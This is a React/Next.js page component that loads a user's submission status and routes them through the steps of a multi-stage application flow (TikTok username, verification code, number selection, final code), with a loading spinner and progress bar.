
'use client';

import { ArrowRight, User, Loader2 } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useAuth } from '@/hooks/use-auth';
import { useToast } from '@/hooks/use-toast';
import { useEffect, useCallback } from 'react';

import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import type { Submission } from '@/lib/types';


export default function StartPage() {
    const router = useRouter();
    const { user, isLoading, setIsLoading, setSubmission } = useAuth();
    const { toast } = useToast();
    
    const fetchSubmission = useCallback(async () => {
        if (!user?.id) return;
        setIsLoading(true);
        try {
            const res = await fetch(`/api/submissions?id=${user.id}`);
            
            if (!res.ok) {
                 if (res.status === 404) {
                    // This is fine, it means it's a new user.
                    // The user object from auth is enough.
                    setSubmission(null);
                    return;
                }
                throw new Error('Failed to fetch your submission data.');
            }

            const data: Submission = await res.json();
            setSubmission(data);
            
            if (data.finalCodeStatus === 'approved') {
                router.push('/success');
            } else if (data.phoneNumberStatus === 'approved') {
                router.push('/start/final-code');
            } else if (data.verificationCodeStatus === 'approved') {
                router.push('/start/select-number');
            } else if (data.tiktokUsernameStatus === 'approved') {
                router.push('/start/verify-code');
            }

        } catch (err: any) {
             toast({ variant: 'destructive', title: 'Error', description: err.message });
        } finally {
            setIsLoading(false);
        }
    }, [user?.id, router, toast, setIsLoading, setSubmission]);

    useEffect(() => {
        fetchSubmission();
    }, [fetchSubmission]);


    const handleContinue = () => {
        // If there's a submission record, route based on its status.
        // Otherwise, it's a fresh start.
        if (user?.submission) {
             if (user.submission.finalCodeStatus === 'approved') {
                router.push('/success');
            } else if (user.submission.phoneNumberStatus === 'approved') {
                router.push('/start/final-code');
            } else if (user.submission.verificationCodeStatus === 'approved') {
                router.push('/start/select-number');
            } else {
                router.push('/start/verify-code');
            }
        } else {
            router.push('/start/verify-code');
        }
    }


    if (isLoading) {
        return (
             <div className="w-full max-w-lg text-center">
                <Loader2 className="h-12 w-12 animate-spin text-primary mx-auto mb-4" />
                <h1 className="text-xl font-semibold">Fetching your progress...</h1>
             </div>
        )
    }

    return (
        <div className="w-full max-w-lg">
            <div className="text-center mb-8">
                 <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <User className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Welcome, {user?.id}!</h1>
                <p className="text-muted-foreground">Let's continue your application.</p>
            </div>
            
            <Progress value={25} className="w-[80%] mx-auto mb-8" />

            <div className="flex justify-end pt-4">
                <Button onClick={handleContinue} size="lg" className="rounded-full">
                    Continue
                    <ArrowRight className="ml-2 h-5 w-5" />
                </Button>
            </div>
        </div>
    );
}
